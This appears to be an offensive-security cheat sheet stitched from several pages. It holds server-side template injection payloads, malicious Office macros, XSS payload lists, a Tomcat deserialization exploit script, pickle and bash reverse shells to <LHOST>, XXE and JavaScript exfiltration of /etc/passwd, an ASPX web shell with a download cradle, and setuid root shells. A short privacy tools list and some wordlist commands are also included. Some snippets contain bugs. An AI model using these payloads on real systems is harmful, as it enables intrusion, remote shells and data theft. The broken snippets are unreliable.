{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{{'a'.toUpperCase()}} 
{{ request }}
{{self}}
<%= File.open('/etc/passwd').read %>
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{$smarty.version}
{php}echo `id`;{/php}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

## Visual Basic for Application (VBA)

### Basic Structure

Navigate to: `View > Macros`

```c
Sub Document_Open()
  Macro
End Sub

Sub AutoOpen()
  Macro
End Sub

Sub Macro()
  MsgBox ("FOOBAR")
End Sub
```

Save it as `<FILE>.doc` or `<FILE>.docm`.

### Malicious Function

```c
Sub Exec()
  Dim payload As String
  payload = "calc.exe"
  CreateObject("Wscript.Shell").Run payload,0
End Sub
```

Create `AutoOpen()` and `DocumentOpen()` functions to execute the `malicious script`.

## Windows Scripting Host (WSH)

```c
C:\> wscript <FILE>.vbs
C:\> cscript <FILE>.vbs
C:\> wscript /e:VBScript C:\<FILE>.txt
```

### Examples

```c
Dim message
message = "<FOOBAR>"
MsgBox message
```

```c
Set shell = WScript.CreateObject(Wscript.Shell"")
shell.Run("C:\Windows\System32\calc.exe" & WScript.ScriptFullName),0,True
```

## Cross-Site Scripting (XSS)

> https://github.com/payloadbox/xss-payload-list

### Common Payloads

```c
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script src="http://<LHOST>/<FILE>"></script>
```

### IMG Payloads

```c
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
```

### SVG Payloads

```c
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
```

### DIV Payloads

```c
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```

## xterm Reverse Shell

The following command should be run on the server. It will try to connect back <LHOST> on port `6001/TCP`.

```c
$ xterm -display <LHOST>:1
```

To catch the incoming xterm, start an X-Server on attacker machine (:1 – which listens on port `6001/TCP`.

```c
$ Xnest :1
$ xhost +10.10.10.211
```

## ysoserial

> https://github.com/frohoff/ysoserial

> https://github.com/pwntester/ysoserial.net

```c
$ java -jar ysoserial-master-SNAPSHOT.jar
```

### Create Reverse Shell

```c
$ java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 'nc <LHOST> <LPORT> -e /bin/sh' | base64 -w 0
$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
```

### Apache Tomcat RCE by Deserialization Skeleton Script

```c
filename=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
ip=$1
port=$2
cmd="bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
jex="bash -c {echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"
java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$filename.session
curl -s -F "data=@/tmp/$filename.session" http://<RHOST>:8080/upload.jsp?email=test@mail.com > /dev/null
curl -s http://<RHOST>:8080/ -H "Cookie: JSESSIONID=../../../../../../../../../../opt/samples/uploads/$filename" > /dev/null
```

```c
$ ./shell.sh <RHOST> <RPORT>
```

## ysoserial.net

```c
PS C:\> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "<COMMAND>" --path="/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTION_KEY>" --validationalg="SHA1" --validationkey="<VALIDATION_KEY>"
```

### Linux Setup

```c
$ sudo apt-get install -y mono-complete wine winetricks
```

```c
$ winetricks dotnet48
```

```c
$ wine ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "<COMMAND>" --path="/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTION_KEY>" --validationalg="SHA1" --validationkey="<VALIDATION_KEY>"
```






# Privacy

- [Resources](#resources)

## Table of Contents

- [Mozilla Firefox](#mozilla-firefox)

## Resources

| Service or Tool | Descritpion | URL |
| --- | --- | --- |
| addy.io | Anonymous Email Forwarding | https://addy.io |
| Briar | Secure messaging, anywhere. | https://briarproject.org |
| Browserleaks | BrowserLeaks is a suite of tools that offers a range of tests to evaluate the security and privacy of your web browser. | https://browserleaks.com |
| Courvix Network | Providing free services since 2017. | https://courvix.com |
| CTemplar | Armored Email. | https://ctemplar.com |
| Debotnet | 🔥🚀 Debotnet is a tiny portable tool for controlling Windows 10's many privacy-related settings and keep your personal data private. | https://github.com/builtbybel/debotnet |
| digitalcourage | Zensurfreier DNS-Server | https://digitalcourage.de/support/zensurfreier-dns-server |
| DuckDuckGo | Privacy focused search engine. | https://duckduckgo.com |
| Eletronic Frontier Foundation | The leading nonprofit defending digital privacy, free speech, and innovation. | https://www.eff.org |
| Encrypt.to | Send encrypted PGP messages with one click. | https://encrypt.to |
| GrapheneOS | The private and secure mobile operating system with Android app compatibility. | https://grapheneos.org |
| Guerrilla Mail | Disposable Temporary E-Mail Address. | https://www.guerrillamail.com |
| hackint | hackint is a communication network for the hacker community, but anyone is welcome to use its services. | https://www.hackint.org |
| Have I Been Pwned | Check if your email address is in a data breach | https://haveibeenpwned.com |
| How to disable Firefox Telemetry and Data Collection | How to disable Firefox Telemetry and Data Collection | https://github.com/K3V1991/Disable-Firefox-Telemetry-and-Data-Collection |
| I2P | The Invisible Internet is a privacy by design, people-powered network. It is a truly free and anonymizing Internet alternative. | https://geti2p.net/en |
| K-9 Mail | K-9 Mail is an open source email client focused on making it easy to chew through large volumes of email. | https://k9mail.app |
| Keybase | End-to-end encryption for things that matter. | https://keybase.io |
| Lokinet | Anonymous Internet Access. | https://lokinet.org/?s=09 |
| mailbox.org | Secure e-mail provider from Germany. | https://mailbox.org/en/ |
| Mailfence | Secure and private email. | https://mailfence.com |
| Matrix | An open network for secure, decentralised communication. | https://matrix.org |
| Mobilizon | Gather, organize and mobilize yourselves with a convivial, ethical, and emancipating tool. | https://mobilizon.org/en/ |
| Nitrokey | Open Source IT-Security Hardware Made in Germany | https://www.nitrokey.com |
| Noisy | Simple random DNS, HTTP/S internet traffic noise generator | https://github.com/1tayH/noisy |
| OONI | Open Observatory of Network Interference | https://ooni.org |
| personal-security-checklist | 🔒 A compiled checklist of 300+ tips for protecting digital security and privacy in 2023. | https://github.com/Lissy93/personal-security-checklist |
| Posteo | Ad-free, no tracking, no user profiling email provider | https://posteo.de/en |
| privacy.sexy | Open-source tool to enforce privacy & security best-practices on Windows, macOS and Linux, because privacy is sexy 🍑🍆 | https://privacy.sexy |
| PrivacyGuardian | Protect your information when buying a domain name | https://www.privacyguardian.org |
| PrivacyTests.org | Open-source tests of web browser privacy. | https://privacytests.org |
| Privacy Tools | Privacy Tools Guide: Website for Encrypted Software & Apps. | https://www.privacytools.io |
| Proton | Proton privacy services | https://proton.me |
| ProxyChains | proxychains - a tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy. Supported auth-types: "user/pass" for SOCKS4/5, "basic" for HTTP. | https://github.com/haad/proxychains |
| PureOS | A fully-convergent, user friendly, secure and freedom respecting OS for your daily usage. | https://pureos.net |
| Qubes OS | A reasonably secure operating system. | https://www.qubes-os.org |
| Quiet | Whether it's for an organization, a community, or a group chat with friends, Quiet lets you control all your data without running your own servers. | https://tryquiet.org |
| Redact | Free And Private Image Redaction In The Browser | https://redact.photo |
| SecureDrop | Share and accept documents securely. | https://securedrop.org |
| Session | SendMessages,Not Metadata. | https://getsession.org |
| Share a secret | Secret content sharing. | https://onetimesecret.com |
| Shellclear | Secure shell history commands by finding sensitive data. | https://github.com/rusty-ferris-club/shellclear |
| Signal | An unexpected focus on privacy, combined with all of the features you expect. | https://www.signal.org |
| SimpleLogin | Receive and send emails anonymously. | https://simplelogin.io |
| SSD.EFF.ORG | Surveillance Self-Defense | https://ssd.eff.org |
| Tails | Tails is a portable operating system that protects against surveillance and censorship. | https://tails.net |
| Tor | Defend yourself against tracking and surveillance. Circumvent censorship. | https://www.torproject.org |
| Tox | Tox is easy-to-use software that connects you with friends and family without anyone else listening in. While other big-name services require you to pay for features, Tox is completely free and comes without advertising - forever. | https://tox.chat |
| What every Browser knows about you | This is a demonstration of all the data your browser knows about you. | https://webkay.robinlinus.com |
| Whonix | Superior Internet Privacy with Whonix | https://www.whonix.org |

## Mozilla Firefox

### Disable Firefox Telemetry and Data Collection

> https://github.com/K3V1991/Disable-Firefox-Telemetry-and-Data-Collection

```c
about:config
```

| Preference | Value to change |
| --- | --- |
| browser.newtabpage.activity-stream.feeds.telemetry | false |
| browser.newtabpage.activity-stream.telemetry | false |
| browser.ping-centre.telemetry | false |
| datareporting.healthreport.service.enabled | false |
| datareporting.healthreport.uploadEnabled | false |
| datareporting.policy.dataSubmissionEnabled | false |
| datareporting.sessions.current.clean | true
| devtools.onboarding.telemetry.logged | false |
| toolkit.telemetry.archive.enabled | false |
| toolkit.telemetry.bhrPing.enabled | false |
| toolkit.telemetry.enabled | false |
| toolkit.telemetry.firstShutdownPing.enabled | false |
| toolkit.telemetry.hybridContent.enabled | false |
| toolkit.telemetry.newProfilePing.enabled | false |
| toolkit.telemetry.prompted | Number Value 2 |
| toolkit.telemetry.rejected | true
| toolkit.telemetry.reportingpolicy.firstRun | false |
| toolkit.telemetry.server | Delete URL |
| toolkit.telemetry.shutdownPingSender.enabled | false |
| toolkit.telemetry.unified | false |
| toolkit.telemetry.unifiedIsOptIn | false |
| toolkit.telemetry.updatePing.enabled | false |






# Templates

## Table of Contents

- [01 Information Gathering](#01-information-gathering)
- [02 Vulnerability Analysis](#02-vulnerability-analysis)
- [03 Web Application Analysis](#03-web-application-analysis)
- [04 Database Assessment](#04-database-assessment)
- [05 Password Attacks](#05-password-attacks)
- [06 Wireless Attacks](#06-wireless-attacks)
- [07 Reverse Engineering](#07-reverse-engineering)
- [08 Exploitation Tools](#08-exploitation-tools)
- [09 Sniffing & Spoofing](#09-sniffing--spoofing)
- [10 Post Exploitation](#10-post-exploitation)
- [11 Forensics](#11-forensics)
- [12 Reporting Tools](#12-reporting-tools)
- [13 Social Engineering Tools](#13-social-engineering-tools)
- [Basics](#basics)
- [Exploiting](#exploiting)

## 01 Information Gathering
## 02 Vulnerability Analysis
## 03 Web Application Analysis

### Hypertext Markup Language (HTML)

#### Hypertext Markup Language (HTML) Injection

```c
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

### JavaScript (JS)

#### JavaScript (JS) Fetch Uniform Resource Locator (URL) and Base64 Encoding

```c
<script>fetch('http://<RHOST>/auth.php').then(r => r.text()).then(d => fetch("http://<LHOST>"+btoa(d)));</script>
```

```c
const Req1 = new XMLHttpRequest();
Req1.open("GET", "http://<RHOST>/index.php", true);

Req1.onload = function(Event) {
        const response = btoa(Req1.response);

        const Req2 = new XMLHttpRequest();
        Req2.open("GET", "http://<LHOST>/?"+response, true);
        Req2.send();
};
Req1.send();
```

### JavaScript Object Notation (JSON)

#### JavaScript Object Notation (JSON) POST Request with Authentication

```c
POST /<PATH> HTTP/1.1
Host: <RHOST>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Content-Length: 95
Connection: close

{
  "auth":{
    "name":"<USERNAME>",
    "password":"<PASSWORD>"
  },
  "filename":"<FILE>"
}
```

### Python

#### Python Pickle Remote Code Execution (RCE)

```python
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat <LHOST> <LHOST> > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```

```python
import base64
import pickle
import os

class RCE:
	def __reduce__(self):
		cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'")
		return = os.system, (cmd, )

if __name__ == '__main__':
	pickle = pickle.dumps(RCE())
	print(bas64.b64encode(pickled))
```

#### Python Redirect for Server-Side Request Forgery (SSRF)

```python
#!/usr/bin/python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
  def do_GET(self):
      self.send_response(302)
      self.send_header('Location', sys.argv[1])
      self.end_headers()

HTTPServer(("0.0.0.0", 80), Redirect).serve_forever()
```

```c
sudo python3 redirect.py http://127.0.0.1:3000/
```

```python
#!/usr/bin/env python

import SimpleHTTPServer
import SocketServer
import sys
import argparse

def redirect_handler_factory(url):
    """
    returns a request handler class that redirects to supplied `url`
    """
    class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
       def do_GET(self):
           self.send_response(301)
           self.send_header('Location', url)
           self.end_headers()

       def do_POST(self):
           self.send_response(301)
           self.send_header('Location', url)
           self.end_headers()

    return RedirectHandler


def main():

    parser = argparse.ArgumentParser(description='HTTP redirect server')

    parser.add_argument('--port', '-p', action="store", type=int, default=80, help='port to listen on')
    parser.add_argument('--ip', '-i', action="store", default="", help='host interface to listen on')
    parser.add_argument('redirect_url', action="store")

    myargs = parser.parse_args()

    redirect_url = myargs.redirect_url
    port = myargs.port
    host = myargs.ip

    redirectHandler = redirect_handler_factory(redirect_url)

    handler = SocketServer.TCPServer((host, port), redirectHandler)
    print("serving at port %s" % port)
    handler.serve_forever()

if __name__ == "__main__":
    main()
```

#### Python Web Request

```python
import requests
import re

http_proxy  = "http://127.0.0.1:8080"
proxyDict = {
              "http"  : http_proxy,
            }
// get a session
r = requests.get('http://')
// send request
r = requests.post('<RHOST>', data={'key': 'value'}, cookies={'PHPSESSID': r.cookies['PHPSESSID']} , proxies=proxyDict)
```

### Web Shells

#### Active Server Page Extended (ASPX)

```c
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/shellyjelly.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
-->
```

### Extensible Markup Language (XML)

#### Extensible Markup Language (XML) Hypertext Markup Language (HTTP) Request (XHR) in JavaScript (JS)

##### Payload

```c
var xhr = new XMLHttpRequest();
xhr = new XMLHttpRequest();
xhr.open('GET', 'http://localhost:8080/users/');
xhr.onreadystatechange = function() {
  var users = JSON.parse(xhr.responseText);
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    for (var i = 0; i < users.length; ++i) {
      console.table(users[i]);
    }
  } else {
    console.error('There was a problem with the request. ' + users);
  }
}
xhr.send();
```

##### Forged Request

```c
myhttpserver = 'http://<LHOST>/'
targeturl = 'http://<RHOST>/'

req = new XMLHttpRequest;
req.onreadystatechange = function() {
    if (req.readyState == 4) {
            req2 = new XMLHttpRequest;
            req2.open('GET', myhttpserver + btoa(this.responseText),false);
            req2.send();
        }
}
req.open('GET', targeturl, false);
req.send();
```

##### Simple Version

```c
req = new XMLHTTPRequest;
req.open('GET',"http://<RHOST>/revshell.php");
req.send();
```

#### Extensible Markup Language (XML) External Entity (XXE)

##### Request

```c
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % <NAME> SYSTEM 
"http://<LHOST>/<FILE>.dtd">%<NAME>;]>
<root>
<method>GET</method>
<uri>/</uri>
<user>
<username><NAME>;</username>
<password><NAME></password>
</user>
</root>
```

##### Content of <FILE>.dtd

```c
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<LHOST>/?f=%file;'>">
%eval;
%exfiltrate;
```

### Cross-Site Scripting (XSS)

#### JavaScript (JS) to read Files on the System (.js)

```c
const fs = require('fs');

fs.readFile('/etc/passwd', 'utf8', (err, data) => {
  if (err) throw err;
  console.log(data);
});
```

#### Payload from Extensible Markup Language (XML) File

```c
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns:html="http://w3.org/1999/xhtml">
<html:script>prompt(document.domain);</html:script>
</html>
```

## 04 Database Assessment
## 05 Password Attacks
## 06 Wireless Attacks
## 07 Reverse Engineering
## 08 Exploitation Tools
## 09 Sniffing & Spoofing
## 10 Post Exploitation

### YAML Ain't Markup Language (YAML)

#### Bad YAML Ain't Markup Language (YAML)

```c
- hosts: localhost
  tasks:
    - name: badyml
      command: chmod +s /bin/bash
```

## 11 Forensics
## 12 Reporting Tools
## 13 Social Engineering Tools
## Basics
	
### C

#### Shell Option 1

```c
#include <unistd.h>
#include <errno.h>

main( int argc, char ** argv, char ** envp )
{
    setuid(0);
    setgid(0);
    envp = 0;
    system ("/bin/bash", argv, envp);
return;
}
```

#### Shell Option 2

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);

    system("/bin/bash");
    return 0;
}
```

##### Compiling

```
$ gcc -o shell shell.c
```

### Secure Shell (SSH)

#### Secure Shell (SSH) Program Execution

```python
#!/usr/bin/python
from pwn import *

s =  ssh(host='', user='', password='')
p = s.run('cd <PATH> && ./<VULNERABILITY>')
p.recv()
p.sendline(<payload>)
p.interactive()
s.close()
```

## Exploiting

### Python

#### Skeleton Exploit Python Script

> https://github.com/0xsyr0/Buffer_Overflow

```c
#!/usr/bin/python

import socket,sys

address = '127.0.0.1'
port = 9999
buffer = #TBD

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
```







# Wordlists

- [Resources](#resources)

## Table of Contents

- [CeWL](#cewl)
- [CUPP](#cupp)
- [crunch](#crunch)
- [Username Anarchy](#username-anarchy)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| bopscrk | Tool to generate smart and powerful wordlists | https://github.com/r3nt0n/bopscrk |
| CeWL | CeWL is a Custom Word List Generator. | https://github.com/digininja/cewl |
| clem9669/wordlists | Various wordlists FR & EN - Cracking French passwords | https://github.com/clem9669/wordlists |
| COOK | An overpower wordlist generator, splitter, merger, finder, saver, create words permutation and combinations, apply different encoding/decoding and everything you need. | https://github.com/glitchedgitz/cook |
| CUPP | Common User Passwords Profiler (CUPP) | https://github.com/Mebus/cupp |
| Kerberos Username Enumeration | Collection of username lists for enumerating kerberos domain users | https://github.com/attackdebris/kerberos_enum_userlists |
| maskprocessor | High-Performance word generator with a per-position configureable charset | https://github.com/hashcat/maskprocessor |
| pseudohash | Password list generator that focuses on keywords mutated by commonly used password creation patterns | https://github.com/t3l3machus/psudohash |
| SecLists | A collection of multiple types of lists used during security assessments, collected in one place. | https://github.com/danielmiessler/SecLists |
| Username Anarchy | Username tools for penetration testing | https://github.com/urbanadventurer/username-anarchy |

## CeWL

> https://github.com/digininja/cewl

```c
$ cewl -d 0 -m 5 -w <FILE> http://<RHOST>/index.php --lowercase
$ cewl -d 5 -m 3 -w <FILE> http://<RHOST>/index.php --with-numbers
```

## CUPP

> https://github.com/Mebus/cupp

```c
$ ./cupp -i
```

## crunch

```c
$ crunch 5 5 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -o <FILE>.txt
```

## Username Anarchy

> https://github.com/urbanadventurer/username-anarchy

```c
$ ruby username-anarchy -f first,first.last,last,flast -i <FILE> > <FILE>
```




